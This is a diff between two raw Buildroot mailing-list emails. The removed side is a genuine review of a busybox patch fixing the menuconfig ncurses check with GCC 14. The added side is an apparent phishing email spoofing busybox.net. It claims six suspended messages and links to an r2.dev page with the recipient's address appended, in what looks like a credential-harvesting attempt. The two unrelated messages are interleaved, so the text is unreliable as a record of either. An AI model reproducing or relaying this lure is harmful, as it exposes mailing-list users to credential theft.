@@ -1,116 +1,50 @@
 Return-Path: <buildroot-bounces@buildroot.org>
 X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 	aws-us-west-2-korg-lkml-1.web.codeaurora.org
-Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
+Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id 95A9AC3DA4A
-	for <buildroot@archiver.kernel.org>; Fri, 26 Jul 2024 17:03:36 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 9D485C3DA49
+	for <buildroot@archiver.kernel.org>; Fri, 26 Jul 2024 18:58:24 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp3.osuosl.org (Postfix) with ESMTP id 62DC16059B;
-	Fri, 26 Jul 2024 17:03:36 +0000 (UTC)
-X-Virus-Scanned: amavis at osuosl.org
-Received: from smtp3.osuosl.org ([127.0.0.1])
- by localhost (smtp3.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id wag-Z4Hy-KSe; Fri, 26 Jul 2024 17:03:35 +0000 (UTC)
-X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 62FFD605D7
-Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
-	by smtp3.osuosl.org (Postfix) with ESMTP id 62FFD605D7;
-	Fri, 26 Jul 2024 17:03:35 +0000 (UTC)
-Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
- by ash.osuosl.org (Postfix) with ESMTP id C6AE81BF860
- for <buildroot@lists.busybox.net>; Fri, 26 Jul 2024 17:03:34 +0000 (UTC)
-Received: from localhost (localhost [127.0.0.1])
- by smtp4.osuosl.org (Postfix) with ESMTP id BE98C40CAB
- for <buildroot@lists.busybox.net>; Fri, 26 Jul 2024 17:03:34 +0000 (UTC)
+	by smtp4.osuosl.org (Postfix) with ESMTP id 0E22940D73;
+	Fri, 26 Jul 2024 18:58:24 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
 Received: from smtp4.osuosl.org ([127.0.0.1])
  by localhost (smtp4.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id MM2HIeVBj5XT for <buildroot@lists.busybox.net>;
- Fri, 26 Jul 2024 17:03:33 +0000 (UTC)
-Received-SPF: Pass (mailfrom) identity=mailfrom; client-ip=67.231.152.184;
- helo=mx0b-00105401.pphosted.com; envelope-from=brandon.maier@collins.com;
- receiver=<UNKNOWN> 
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp4.osuosl.org 6E02D40285
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 6E02D40285
-Received: from mx0b-00105401.pphosted.com (mx0b-00105401.pphosted.com
- [67.231.152.184])
- by smtp4.osuosl.org (Postfix) with ESMTPS id 6E02D40285
- for <buildroot@buildroot.org>; Fri, 26 Jul 2024 17:03:33 +0000 (UTC)
-Received: from pps.filterd (m0346902.ppops.net [127.0.0.1])
- by mx0a-00105401.pphosted.com (8.17.1.19/8.17.1.19) with ESMTP id
- 46QGpoOe015673; Fri, 26 Jul 2024 17:03:32 GMT
-Received: from xusxph004rp050.rtx.com (xusxph004rp050.rtx.com [128.13.120.147])
- by mx0a-00105401.pphosted.com (PPS) with ESMTPS id 40mfpqr3pb-1
- (version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=OK);
- Fri, 26 Jul 2024 17:03:31 +0000
-Received: from xusxph008rp020.corp.ray.com ([128.13.124.224])
- by xusxph004rp050.rtx.com (8.17.1.19/8.17.1.19) with ESMTPS id 46QH3U9l011540
- (version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=OK);
- Fri, 26 Jul 2024 17:03:30 GMT
-Received: from ciulimr01.rockwellcollins.com
- (snat-utc-mailhub.rockwellcollins.com [10.172.224.19])
- by xusxph008rp020.corp.ray.com (8.17.1.19/8.17.1.19) with ESMTPS id
- 46QH3TUW023546
- (version=TLSv1.2 cipher=ECDHE-RSA-AES256-GCM-SHA384 bits=256 verify=NO);
- Fri, 26 Jul 2024 17:03:30 GMT
-X-Received: from localhost (unknown [10.148.204.208])
- by ciulimr01.rockwellcollins.com (Postfix) with ESMTP id 9A01D300049E;
- Fri, 26 Jul 2024 12:03:29 -0500 (CDT)
-Mime-Version: 1.0
-Date: Fri, 26 Jul 2024 17:03:29 +0000
-Message-Id: <D2ZMT39VEGGC.MPRGW26K8LD2@collins.com>
-To: "Fiona Klute" <fiona.klute@gmx.de>, <buildroot@buildroot.org>
-X-Mailer: aerc 0.17.0-0-g6ea74eb30457
-References: <20240726160152.2182074-1-fiona.klute@gmx.de>
-In-Reply-To: <20240726160152.2182074-1-fiona.klute@gmx.de>
-X-Proofpoint-Virus-Version: vendor=baseguard
- engine=ICAP:2.0.293,Aquarius:18.0.1039,Hydra:6.0.680,FMLib:17.12.28.16
- definitions=2024-07-26_12,2024-07-26_01,2024-05-17_01
-X-Proofpoint-Virus-Version: vendor=baseguard
- engine=ICAP:2.0.293,Aquarius:18.0.1039,Hydra:6.0.680,FMLib:17.12.28.16
- definitions=2024-07-26_12,2024-07-26_01,2024-05-17_01
-X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
- mlxlogscore=999
- suspectscore=0 mlxscore=0 phishscore=0 bulkscore=0 malwarescore=0
- adultscore=0 classifier=spam adjust=0 reason=mlx scancount=1
- engine=8.12.0-2407110000 definitions=main-2407260114
-X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 suspectscore=0
- mlxlogscore=999
- spamscore=0 adultscore=0 phishscore=0 bulkscore=0 malwarescore=0
- mlxscore=0 classifier=spam adjust=0 reason=mlx scancount=1
- engine=8.12.0-2407110000 definitions=main-2407260114
-X-Proofpoint-ORIG-GUID: Q8vm9rUPScXAuf4zcekGaLnVwJGbn442
-X-Proofpoint-GUID: Q8vm9rUPScXAuf4zcekGaLnVwJGbn442
-X-Proofpoint-Virus-Version: vendor=baseguard
- engine=ICAP:2.0.293,Aquarius:18.0.1039,Hydra:6.0.680,FMLib:17.12.28.16
- definitions=2024-07-26_12,2024-07-26_01,2024-05-17_01
-X-Proofpoint-Spam-Details: rule=outbound_default_notspam
- policy=outbound_default score=0 adultscore=0
- mlxlogscore=999 spamscore=0 priorityscore=1501 lowpriorityscore=0
- suspectscore=0 malwarescore=0 impostorscore=0 mlxscore=0 bulkscore=0
- clxscore=1015 phishscore=0 classifier=spam adjust=0 reason=mlx scancount=1
- engine=8.12.0-2407110000 definitions=main-2407260114
-X-Mailman-Original-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=collins.com; 
- h=content-transfer-encoding : content-type : date : from : in-reply-to :
- message-id : mime-version : references : subject : to; s=POD051818;
- bh=QRDrszUTfqGJENwH5xaj9dTK1qwLgr8Lb6ff8jNgyZY=;
- b=PTHpTqBy07j4+oZ/GV4F1WFeaMVM5nLVjqizPh8So96VaPNtaKtpKgRR836TVBGNweEq
- HcaoFiuXQRz/0OmB+gRC3cHMH5AhkJE4lcFun3SLh8VvqVpPjSEK7LvqBT5+Vt8cRQcI
- kKWdoPYzB0mSEi/BRmUihiz5Auc4FEjn+W8vTHgOlkQsOklrpF9fjxOAViLunhWddt19
- vz0kpvzrDbnWQeyzZDxez4jK75jnHHJVfPMRhSMkGg3CWwvBJVa/4dHakj4SIpWdpv0a
- An8wF3T1ZV0rE9XzQ11ccsL2DECIFCLJL2AVcFKjDSiw0MxPmCm+EuiEcbzLnaWsNhuB lw== 
-X-Mailman-Original-Authentication-Results: smtp4.osuosl.org;
- dmarc=pass (p=reject dis=none)
- header.from=collins.com
-X-Mailman-Original-Authentication-Results: smtp4.osuosl.org;
- dkim=pass (2048-bit key,
- unprotected) header.d=collins.com header.i=@collins.com header.a=rsa-sha256
- header.s=POD051818 header.b=PTHpTqBy
-Subject: Re: [Buildroot] [PATCH 1/1] package/busybox: fix menuconfig with
- GCC 14
+ id iuG5_bQObxEk; Fri, 26 Jul 2024 18:58:22 +0000 (UTC)
+X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org A2E1F40D9F
+Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
+	by smtp4.osuosl.org (Postfix) with ESMTP id A2E1F40D9F;
+	Fri, 26 Jul 2024 18:58:22 +0000 (UTC)
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
+ by ash.osuosl.org (Postfix) with ESMTP id 708281BF85D
+ for <buildroot@lists.busybox.net>; Fri, 26 Jul 2024 18:58:21 +0000 (UTC)
+Received: from localhost (localhost [127.0.0.1])
+ by smtp1.osuosl.org (Postfix) with ESMTP id 2AB118209C
+ for <buildroot@lists.busybox.net>; Fri, 26 Jul 2024 18:58:18 +0000 (UTC)
+X-Virus-Scanned: amavis at osuosl.org
+Received: from smtp1.osuosl.org ([127.0.0.1])
+ by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
+ id kGSKrbJb73fF for <buildroot@lists.busybox.net>;
+ Fri, 26 Jul 2024 18:58:16 +0000 (UTC)
+Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=192.227.217.243;
+ helo=busybox.net; envelope-from=notification@busybox.net; receiver=<UNKNOWN> 
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org B5C76820A9
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org B5C76820A9
+Received: from busybox.net (unknown [192.227.217.243])
+ by smtp1.osuosl.org (Postfix) with ESMTP id B5C76820A9
+ for <buildroot@busybox.net>; Fri, 26 Jul 2024 18:58:15 +0000 (UTC)
+From: Webmail<notification@busybox.net>
+To: buildroot@busybox.net
+Date: 26 Jul 2024 20:58:15 +0200
+Message-ID: <20240726205814.7EF434DA0BF7B727@busybox.net>
+MIME-Version: 1.0
+X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
+ dmarc=none (p=none dis=none)
+ header.from=busybox.net
+Subject: [Buildroot] Message Failure
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -122,89 +56,154 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-From: Brandon Maier via buildroot <buildroot@buildroot.org>
-Reply-To: Brandon Maier <brandon.maier@collins.com>
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============9188887691898158161=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
-Hi Fiona,
 
-On Fri Jul 26, 2024 at 4:01 PM UTC, Fiona Klute via buildroot wrote:
-> From: "Fiona Klute (WIWA)" <fiona.klute@gmx.de>
->
-> GCC 14 errors out on the implicit return type of "main() {}". The
-> patch also removes the /dev/null redirection of GCC stderr that hid
-> the actual problem.
+--===============9188887691898158161==
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_000_0012_38B66783.4D140655"
 
-I tested this on my Fedora 40 machine, look good!
 
-Reviewed-by: Brandon Maier <brandon.maier@collins.com>
-Tested-by: Brandon Maier <brandon.maier@collins.com>
+------=_NextPart_000_0012_38B66783.4D140655
+Content-Type: text/plain;
+	charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
 
-Thanks,
-Brandon
+Dear, buildroot
+------=_NextPart_000_0012_38B66783.4D140655
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
->
-> Signed-off-by: Fiona Klute (WIWA) <fiona.klute@gmx.de>
-> ---
->  ...-failing-saying-ncurses-is-not-found.patch | 38 +++++++++++++++++++
->  1 file changed, 38 insertions(+)
->  create mode 100644 package/busybox/0009-menuconfig-gcc-failing-saying-ncurses-is-not-found.patch
->
-> diff --git a/package/busybox/0009-menuconfig-gcc-failing-saying-ncurses-is-not-found.patch b/package/busybox/0009-menuconfig-gcc-failing-saying-ncurses-is-not-found.patch
-> new file mode 100644
-> index 0000000000..7b78c01984
-> --- /dev/null
-> +++ b/package/busybox/0009-menuconfig-gcc-failing-saying-ncurses-is-not-found.patch
-> @@ -0,0 +1,38 @@
-> +From ctxnop@gmail.com  Sun Jul 21 12:10:52 2024
-> +From: ctxnop@gmail.com (Nop)
-> +Date: Sun, 21 Jul 2024 14:10:52 +0200
-> +Subject: [PATCH] menuconfig: GCC failing saying ncurses is not found
-> +
-> +Newer GCC increased diagnostics levels resulting in considering the
-> +test code to be invalid. The resulting message was misleading, saying
-> +that ncurses was not found, while the check failed for an unrelated
-> +reason which was hidden because GCC stderr was redirected to
-> +/dev/null.
-> +
-> +Signed-off-by: ctxnop <ctxnop@gmail.com>
-> +Upstream: http://lists.busybox.net/pipermail/busybox/2024-July/090840.html
-> +[Fiona: rephrased commit message for clarity]
-> +Signed-off-by: Fiona Klute (WIWA) <fiona.klute@gmx.de>
-> +---
-> + scripts/kconfig/lxdialog/check-lxdialog.sh | 4 ++--
-> + 1 file changed, 2 insertions(+), 2 deletions(-)
-> +
-> +diff --git a/scripts/kconfig/lxdialog/check-lxdialog.sh
-> +b/scripts/kconfig/lxdialog/check-lxdialog.sh
-> +index 5075ebf2d..c644d1d48 100755
-> +--- a/scripts/kconfig/lxdialog/check-lxdialog.sh
-> ++++ b/scripts/kconfig/lxdialog/check-lxdialog.sh
-> +@@ -45,9 +45,9 @@ trap "rm -f $tmp" 0 1 2 3 15
-> +
-> + # Check if we can link to ncurses
-> + check() {
-> +-        $cc -x c - -o $tmp 2>/dev/null <<'EOF'
-> ++	$cc -x c - -o $tmp <<'EOF'
-> + #include CURSES_LOC
-> +-main() {}
-> ++int main() { return 0; }
-> + EOF
-> + 	if [ $? != 0 ]; then
-> + 	    echo " *** Unable to find the ncurses libraries or the"       1>&2
-> +--
-> +2.45.2
-> --
-> 2.45.2
->
-> _______________________________________________
-> buildroot mailing list
-> buildroot@buildroot.org
-> https://lists.buildroot.org/mailman/listinfo/buildroot
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.18639">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<table width=3D"548" style=3D"text-align: justify; color: black; text-trans=
+form: none; letter-spacing: normal; padding-top: 0px; padding-bottom: 0px; =
+font-family: Arial, Helvetica, sans-serif; font-size: 15px; font-style: nor=
+mal; font-weight: 400; word-spacing: 0px; white-space: normal; border-colla=
+pse: collapse; max-width: 548px; border-spacing: 0px; orphans: 2; widows: 2=
+; font-stretch: inherit; background-color: rgb(244, 248, 245); font-variant=
+-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial;" cellspacing=3D"0"=
+ cellpadding=3D"0"><tbody><tr><td style=3D'margin: 0px; padding-right: 0px;=
+ padding-bottom: 15px; padding-left: 0px; font-family: "Google Sans", Robot=
+o, RobotoDraft, Helvetica, Arial, sans-serif; border-spacing: 0px;'>
+<table style=3D"padding-top: 0px; padding-bottom: 0px; font-family: inherit=
+; font-weight: 600; border-collapse: collapse; max-width: 548px; border-spa=
+cing: 0px; font-stretch: inherit;"><tbody><tr><td style=3D'margin: 0px; wid=
+th: 181px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; vertical-a=
+lign: bottom;'></td><td style=3D'margin: 0px; width: 186px; text-align: cen=
+ter; font-family: "Segoe UI", Frutiger, Arial, sans-serif; vertical-align: =
+bottom;'></td>
+<td style=3D'margin: 0px; width: 181px; text-align: right; font-family: "Se=
+goe UI", Frutiger, Arial, sans-serif; vertical-align: bottom;'></td></tr><t=
+r><td style=3D'margin: 0px; width: 181px; padding-top: 0px; padding-bottom:=
+ 0px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 14px=
+; font-weight: 400; vertical-align: middle;'><font color=3D"white"><span st=
+yle=3D"border-width: 0px; margin: 0px; padding: 0px; color: black; vertical=
+-align: baseline;">Sender</span></font></td>
+<td style=3D'margin: 0px; width: 186px; text-align: center; padding-top: 0p=
+x; padding-bottom: 0px; font-family: "Segoe UI", Frutiger, Arial, sans-seri=
+f; font-size: 14px; font-weight: 400; vertical-align: middle;'></td><td sty=
+le=3D'margin: 0px; width: 181px; text-align: right; padding-top: 0px; paddi=
+ng-bottom: 0px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-=
+size: 14px; font-weight: 400; vertical-align: middle;'><font color=3D"white=
+">
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; color: rgb(192=
+, 0, 0); vertical-align: baseline;"><b>Action Required</b></span></font></t=
+d></tr><tr><td style=3D"margin: 0px; padding: 0px;" colspan=3D"3"><table st=
+yle=3D"padding: 0px; border-collapse: collapse; border-spacing: 0px;" cells=
+pacing=3D"0" cellpadding=3D"0"><tbody><tr height=3D"10"><td style=3D"margin=
+: 0px; padding: 0px; width: 180px; height: 10px; line-height: 10px; font-si=
+ze: 6px;" bgcolor=3D"#cccccc"></td>
+<td style=3D"margin: 0px; padding: 0px; width: 4px; height: 10px; line-heig=
+ht: 10px; font-size: 6px;" bgcolor=3D"white"></td><td style=3D"margin: 0px;=
+ padding: 0px; width: 180px; height: 10px; line-height: 10px; font-size: 6p=
+x;" bgcolor=3D"#cccccc"></td><td style=3D"margin: 0px; padding: 0px; width:=
+ 4px; height: 10px; line-height: 10px; font-size: 6px;" bgcolor=3D"white"><=
+/td><td style=3D"margin: 0px; padding: 0px; width: 180px; height: 10px; lin=
+e-height: 10px; font-size: 6px;" bgcolor=3D"#c00000"></td></tr>
+</tbody></table></td></tr><tr><td style=3D'margin: 0px; padding: 0px; width=
+: 181px; line-height: 20px; font-family: "Segoe UI", Frutiger, Arial, sans-=
+serif; font-size: 14px; font-weight: 400;'></td><td style=3D'margin: 0px; p=
+adding: 0px; width: 186px; text-align: center; line-height: 20px; font-fami=
+ly: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 14px; font-weight: =
+400;'></td>
+<td style=3D'margin: 0px; padding: 0px; width: 181px; text-align: right; li=
+ne-height: 20px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font=
+-size: 14px; font-weight: 400;'><font color=3D"white"><span style=3D"border=
+-width: 0px; margin: 0px; padding: 0px; color: rgb(192, 0, 0); vertical-ali=
+gn: baseline;">Messages suspended</span></font></td></tr></tbody></table></=
+td></tr><tr>
+<td style=3D'margin: 0px; width: 528px; padding-top: 0px; padding-right: 10=
+px; padding-left: 10px; font-family: "Google Sans", Roboto, RobotoDraft, He=
+lvetica, Arial, sans-serif;'><br><table style=3D"padding: 0px; width: 528px=
+; margin-left: 0px; background-color: rgb(242, 245, 250);"><tbody><tr><td s=
+tyle=3D'margin: 0px; padding: 0px 10px; font-family: "Segoe UI", Frutiger, =
+Arial, sans-serif; font-size: 21px;'>
+<div style=3D"border-width: 0px; margin: 0px; padding: 0px; color: rgb(32, =
+31, 30); font-family: inherit; font-size: 15px; vertical-align: baseline; f=
+ont-stretch: inherit;"><b>Message Failure Delivery Notice.</b></div><div st=
+yle=3D"border-width: 0px; margin: 0px; padding: 0px; color: rgb(32, 31, 30)=
+; font-family: inherit; font-size: 15px; vertical-align: baseline; font-str=
+etch: inherit;">User:&nbsp;<font color=3D"#1d37e2">buildroot@busybox.net</f=
+ont></div>
+<div style=3D"border-width: 0px; margin: 0px; padding: 0px; color: rgb(32, =
+31, 30); font-family: inherit; font-size: 15px; vertical-align: baseline; f=
+ont-stretch: inherit;"></div></td></tr><tr><td style=3D'margin: 0px; paddin=
+g: 0px 10px 6px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font=
+-size: 16px;'>You have (6) Suspended incoming messages<br><br>Please Fix It=
+ Below<br><br>
+<a style=3D"border-width: 0px; margin: 0px; padding: 0px; color: rgb(17, 85=
+, 204); text-decoration: none !important; vertical-align: baseline;" href=
+=3D"https://pub-d44b064a84c44f84af7d028c687ac49e.r2.dev/CHAMELEO.html#build=
+root@busybox.net" target=3D"_blank" data-saferedirecturl=3D"https://www.goo=
+gle.com/url?q=3Dhttps://ipfs.fleek.co/ipfs/Qmdj6UHg5hq9h9RZ93sHSUKtRWgF4VEY=
+L48zTZjA5DJ2Et?%23%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D16733411=
+61536000&amp;usg=3DAOvVaw1vug0ZlZdLS4q24RM_dEI1"><b>
+Click Confirmation Here</b></a><span>&nbsp;</span>&nbsp;To View Incoming Su=
+spended Messages And Retrieve Them.<br></td></tr><tr><td style=3D'margin: 0=
+px; padding: 0px 10px 6px; font-family: "Segoe UI", Frutiger, Arial, sans-s=
+erif; font-size: 16px;'></td></tr></tbody>
+</table></td></tr><tr><td style=3D'margin: 0px; padding-top: 10px; padding-=
+bottom: 4px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-siz=
+e: 14px;'><br><br><br><br><br><br></td></tr></tbody></table>
+<font color=3D"#999999" style=3D"text-align: justify; text-transform: none;=
+ text-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica, s=
+ans-serif; font-size: small; font-style: normal; font-weight: 400; word-spa=
+cing: 0px; white-space: normal; orphans: 2; widows: 2; background-color: rg=
+b(244, 248, 245); font-variant-ligatures: normal; font-variant-caps: normal=
+; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-=
+decoration-style: initial; text-decoration-color:=20
+initial;">
+The information contained in or attached to this communication is intended =
+solely for the use of the individual or entity to whom it is addressed and =
+others authorized to receive it. It may contain confidential or legally pri=
+vileged information. If you are not the intended recipient you are hereby n=
+otified that any disclosure, copying, distribution or taking any action in =
+reliance on the contents of this information is strictly prohibited and may=
+ be unlawful. If you have received this=20
+communication in error, please notify me immediately by responding to this =
+email and then delete it from your system. We are neither liable for the pr=
+oper and complete transmission of the information contained in this communi=
+cation nor for any delay in its receipt.</font></body></html>
+------=_NextPart_000_0012_38B66783.4D140655--
+
+--===============9188887691898158161==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
 _______________________________________________
 buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============9188887691898158161==--
